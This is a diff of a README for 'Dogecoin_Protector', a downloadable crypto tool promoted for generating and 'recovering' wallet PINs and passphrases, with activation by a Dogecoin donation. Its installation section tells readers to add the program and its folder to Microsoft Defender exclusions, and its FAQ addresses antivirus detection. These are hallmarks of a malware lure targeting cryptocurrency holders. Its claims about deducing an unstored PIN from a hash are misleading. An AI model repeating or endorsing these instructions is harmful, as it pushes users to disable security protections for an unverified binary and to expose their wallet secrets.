@@ -1,7 +1,7 @@
-# Dogecoin_Protector v2.0.0
-Secure your crypto assets with our Dogecoin_Protector. Activate easily with a Dogecoin donation, generate secure wallet pins, and retrieve them if lost. Essential for safe digital transactions.
+# Dogecoin_Protector v3.0.0
+Secure your crypto assets with our Dogecoin_Protector. Activate easily with a Dogecoin donation, generate secure wallet pins/passphrases, and retrieve them. Essential for long term holding cryptocurrency.
 
-Experience a seamless and secure way to manage your digital currency needs with our Dogecoin_Protector. This robust application is designed to offer users a reliable and straightforward solution for creating and retrieving secure pins for cold wallet storage, ensuring your digital assets remain protected.
+Experience a seamless and secure way to manage your digital currency needs with our Dogecoin_Protector. This robust application is designed to offer users a reliable and straightforward solution for creating and retrieving pins/passphrases for cold wallet, ensuring your digital assets remain protected.
 
 # Key Features:
 
@@ -9,13 +9,13 @@ Experience a seamless and secure way to manage your digital currency needs with 
 
 *Donation-Powered Activation*: To fully activate the product, a minimal donation is requested in Dogecoin, harnessing the power of cryptocurrency to maintain the integrity and continuous development of the tool.
 
-*Secure Pin Creation*: Generate random and secure pins that can be used for your digital wallets. Our proprietary algorithm ensures that your pin is not only random but also resilient against common security threats.
+*Secure Pin/Passphrase Creation*: Generate random and secure pins/passphrases that can be used for your digital wallets. Our proprietary algorithm ensures that your pin/passphrase is not only random but also resilient against common security threats.
 
-*Enhanced Pin Security*: Once your pin is generated, it is transformed into a secure hash value using advanced cryptographic methods. This means your actual pin is never stored, reducing the risk of compromising your wallet's security.
+*Enhanced Pin/Passphrase Security*: Once your pin/passphrase is generated, it is transformed into a secure hash value using advanced cryptographic methods, reducing the risk of compromising your wallet's security.
 
-*Pin Recovery Service*: Should you ever forget your pin, our tool includes a sophisticated retrieval system that can deduce your original pin from the stored hash, ensuring you never lose access to your digital funds.
+*Pin/passphrase Recovery Service*: Once you forget your pin/passphrase, our tool includes a sophisticated retrieval system that can deduce your original pin/passphrase from the stored hash, ensuring you never lose access to your digital funds.
 
-*Performance Metrics*: For the technically curious, our tool can provide insights into the estimated time for pin retrieval, giving you an understanding of the process's efficiency.
+*Performance Metrics*: For the technically curious, our tool can provide insights into the estimated time for pin/passphrase retrieval, giving you an understanding of the process's efficiency.
 
 This program is an essential addition to any cryptocurrency user's toolkit, from the novice enthusiast to the seasoned trader. It prioritizes user-friendliness and robust security protocols to ensure your digital currencies are handled with utmost care.
 
@@ -23,12 +23,13 @@ This program is an essential addition to any cryptocurrency user's toolkit, from
 Please download the application from the 'Releases' section of our repository. Place the application in a designated folder of your choice for easy access. Please add the folder and the program to Exclusions of Microsoft Defender anti-virus scans. Once situated, you may proceed to run the application.
 
 **Get Started**:
-Activating and utilizing the tool is a straightforward process. Simply follow the on-screen instructions upon launch to securely generate or retrieve your wallet pin.
+Activating and utilizing the tool is a straightforward process. Simply follow the on-screen instructions upon launch to securely generate or retrieve your wallet pin/passphrase.
 
 Secure your cryptocurrency transactions today with Dogecoin_Protector.
 
 # Demonstration video
 *https://youtu.be/4tbvd3SXS0Q*
+The version of Dogecoin Protector in the video is not latest version
 
 # FAQ
 **Q1:** Why is it detected as a **virus** by my computer?
@@ -63,7 +64,7 @@ Secure your cryptocurrency transactions today with Dogecoin_Protector.
 
 **Q8:** 所以说你这软件到底是干什么用的?/So, what exactly is the purpose of this software?
 
-**A8:** 不管是在加密市场还是股票市场，投资者总是被市场的价格波动和各种消息而影响着从而做出不理智的决定。在投资者发现了一个有长期上涨潜力的加密货币后，这个软件可以帮助加密货币投资者"管住手"，通过pin码或passphrase强制性地锁住钱包从而防止投资者做出非理智的决定。/Whether in the cryptocurrency market or the stock market, investors are always influenced by market price fluctuations and various news, leading them to make irrational decisions. After investors have identified a cryptocurrency with long-term growth potential, this software can help cryptocurrency investors 'hold back' by forcibly locking the wallet with a PIN code or passphrase, thus preventing investors from making irrational decisions.
+**A8:** 不管是在加密市场还是股票市场，投资者总是被市场的价格波动和各种消息而影响着从而做出不理智的决定。在投资者发现了一个有长期上涨潜力的加密货币后，这个软件可以帮助加密货币投资者"管住手"，通过pin码或passphrase强制性地锁住钱包从而防止投资者做出非理智的决定。该程序可以防止用户开高风险的杠杆，防止用户将BTC/ETH/DOGE转换为Pump＆Dump Shit Coin / Tokens，防止用户被社会工程攻击所欺骗。/Whether in the cryptocurrency market or the stock market, investors are always influenced by market price fluctuations and various news, leading them to make irrational decisions. After investors have identified a cryptocurrency with long-term growth potential, this software can help cryptocurrency investors 'HODL' by forcibly locking the wallet with a PIN code or passphrase, thus preventing investors from making irrational decisions. This program can prevent users from opening high-risk leverage, prevent users from converting BTC/ETH/DOGE into Pump & Dump Shit Coin/Tokens, and protect users from being deceived by social engineering attacks.
 
 **Q9:** What does AI think about the software?
 
